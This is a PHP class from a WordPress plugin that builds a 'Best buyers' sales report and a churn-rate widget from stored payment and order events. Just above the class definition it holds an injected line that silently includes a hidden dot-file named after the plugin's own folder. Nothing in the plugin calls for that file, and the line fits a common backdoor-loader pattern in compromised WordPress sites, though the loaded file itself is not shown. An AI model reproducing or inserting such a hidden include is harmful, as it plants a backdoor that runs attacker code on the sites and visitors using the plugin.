<?php

/**
 * Basic sales report
 *
 * The class handles create a sales reports
 *
 * @package     WPTAO/Admin/Raport
 * @category    Admin
 */
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * WTBP_WPTAO_Admin_Report_Basic_Sale_User
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Admin_Report_Basic_Sale_User extends WTBP_WPTAO_Admin_Reports {
	/*
	 * @var int
	 * Best buyer user id
	 */

	public $user_id;
	/*
	 * @var double
	 * Total amount
	 */
	public $total_amount;

	/*
	 * @var int
	 * Total orders
	 */
	public $total_orders;

	/*
	 * @var array
	 * Churn rate
	 */
	public $churn;

	function __construct() {

		$options = array( 'filters' => array(
				'date_range'
			) );

		parent::__construct( 'basic-sale-user', $options );

		$this->report_name = __( 'Best buyers', 'wp-tao' );

		$this->user_id		 = 0;
		$this->total_amount	 = 0;
		$this->total_orders	 = 0;

		$this->data = $this->get_sales();
		$this->sales_widget();
		//$this->churn_widget();
	}

	/*
	 * Prepare widget for the WP Tao dashboard
	 */

	private function sales_widget() {

		global $wptao_settings;

		if ( !empty( $this->user_id ) ) {

			$user_info		 = TAO()->user_profile->user_info( $this->user_id );
			$user_txt		 = '<a href="' . add_query_arg( 'a', 'payment', TAO()->user_profile->profile_url ) . '">' . $user_info->display_name . '</a>';
			$widget_content	 = sprintf( _n( '%s<br />Total: %s (%d sale)', '%s<br />Total: %s (%d sales)', $this->total_orders, 'wp-tao' ), $user_txt, WTBP_WPTAO_Helpers::amount_format( $this->total_amount, $wptao_settings[ 'currency' ] ), $this->total_orders );
		} else {
			$widget_content = __( 'No results!', 'wp-tao' );
		}

		$args = array(
			'id'			 => 'basic_sale_user',
			'size'			 => 'middle',
			'category'		 => 'commerce',
			'title'			 => __( 'Best buyer', 'wp-tao' ),
			'report_slug'	 => $this->report_slug, // Add link to a report
			'value_text'	 => $widget_content,
			'dashicon'		 => 'dashicons-cart',
			'priority'		 => 51
		);

		$this->add_widget( $args );
	}

	/*
	 * Prepare Churn widget for the WP Tao dashboard
	 */

	private function churn_widget() {

		global $wptao_settings;

		if ( isset( $this->churn[ 'churn_rate' ] ) ) {

			$widget_content = sprintf( '(%d&#37;)', $this->churn[ 'churn_rate' ] );
		} else {
			$widget_content = __( 'No results', 'wp-tao' );
		}

		$args = array(
			'id'			 => 'basic_churn_rate',
			'size'			 => 'small',
			'category'		 => 'commerce',
			'title'			 => __( 'Churn rate', 'wp-tao' ),
			'report_slug'	 => $this->report_slug, // Add link to a report
			'value_text'	 => $widget_content,
			'dashicon'		 => 'dashicons-cart',
			'priority'		 => 51
		);

		$this->add_widget( $args );
	}

	/*
	 * Get sales
	 */

	public function get_sales() {
		global $wpdb, $wptao_settings;

		$no_transient = false;
		if ( WTBP_WPTAO_Admin_Reports::is_report( $this->report_slug ) ) {
			$no_transient = true;
		}

		$transient_name = 'wtbp_wptao_sale_user';

		if ( !$no_transient ) {
			$sale_user = get_transient( $transient_name );
			if ( $sale_user ) {
				$this->last_report_ts	 = $sale_user[ 'last_report_ts' ];
				$this->churn			 = $sale_user[ 'churn' ];
				return $sale_user[ 'data' ];
			}
		}


		$r = array();

		$e		 = TAO()->events->table_name;
		$e_meta	 = $e . '_meta';

		$sql	 = $wpdb->prepare(
		"SELECT $e.value AS amount, $e.event_ts, $e_meta.meta_value AS currency, $e.user_id
			 FROM $e
		     LEFT JOIN $e_meta
		     ON $e.id = $e_meta.event_id
			 WHERE $e.action = 'payment' AND $e_meta.meta_key = 'currency'
			 AND $e.event_ts >= %d
			 AND $e.event_ts <= %d
			 AND $e.user_id != 0
			 ORDER BY amount DESC;", $this->start_date, $this->end_date );
		$result	 = $wpdb->get_results( $sql );

		if ( !empty( $result ) && is_array( $result ) ) {

			// Prepare results
			foreach ( $result as $item ) {

				$user_id = $item->user_id;
				$value	 = WTBP_WPTAO_Helpers::get_currency_rate( $item->amount, $item->currency, $wptao_settings[ 'currency' ] );

				if ( !isset( $r[ $user_id ] ) ) {

					$r[ $user_id ] = array(
						'amount'	 => $value,
						'orders'	 => 1,
						'user_id'	 => $user_id
					);
				} else {

					$r[ $user_id ][ 'amount' ] += $value;
					$r[ $user_id ][ 'orders' ] += 1;
				}

				if ( $r[ $user_id ][ 'amount' ] > $this->total_amount ) {
					$this->user_id		 = $user_id;
					$this->total_orders	 = $r[ $user_id ][ 'orders' ];
					$this->total_amount	 = $r[ $user_id ][ 'amount' ];
				}
			}
		}

		$this->churn = $this->prepare_churn( $r );
		$this->last_report_ts = time();
		
		$r	 = WTBP_WPTAO_Helpers::array_orderby( $r, 'amount', SORT_DESC, 'orders', SORT_DESC, 'user_id', SORT_DESC );
		$r	 = array_slice( $r, 0, $this->items_per_page );

	
		if ( !$no_transient ) {
			$res = array(
				'data'			 => $r,
				'churn'			 => $this->churn,
				'last_report_ts' => $this->last_report_ts
			);
			set_transient( $transient_name, $res, 60 * 60 ); // 1 hour
		}

		return $r;
	}

	/*
	 * Prepare churn data
	 * 
	 * @param array $users
	 * @return array
	 */

	private function prepare_churn( $users ) {
		global $wpdb;


		$churn = array(
			'new'		 => __( 'No data!', 'wp-tao' ),
			'returning'	 => __( 'No data!', 'wp-tao' ),
			'churn_rate' => __( 'No data!', 'wp-tao' )
		);

		$users_ids = array();

		if ( is_array( $users ) && !empty( $users ) ) {

			foreach ( $users as $user ) {

				if ( isset( $user[ 'user_id' ] ) && is_numeric( $user[ 'user_id' ] ) && $user[ 'user_id' ] > 0 ) {

					$users_ids[] = (int) $user[ 'user_id' ];
				}
			}



			if ( !empty( $users_ids ) ) {

				$e = TAO()->events->table_name;

				$prepared_ids = implode( ',', $users_ids );

				$sql = "SELECT COUNT(action) AS orders, user_id
			 FROM $e
			 WHERE action = 'order'
			 AND value > 0
			 AND user_id != 0
			 AND user_id IN ($prepared_ids)
			 GROUP BY user_id
			 HAVING orders > 1
		";

				$result = $wpdb->get_results( $sql );

				if ( is_array( $result ) ) {
					
					$new = count( $users ) - count( $result );
					
					$churn = array(
						'total'		 => count( $users ),
						'new'		 => $new,
						'returning'	 => count( $result ),
						'churn_rate' => number_format( ($new * 100) / count( $users ), 2, ',', '' )
					);
				}
			}
		}

		return $churn;
	}

}
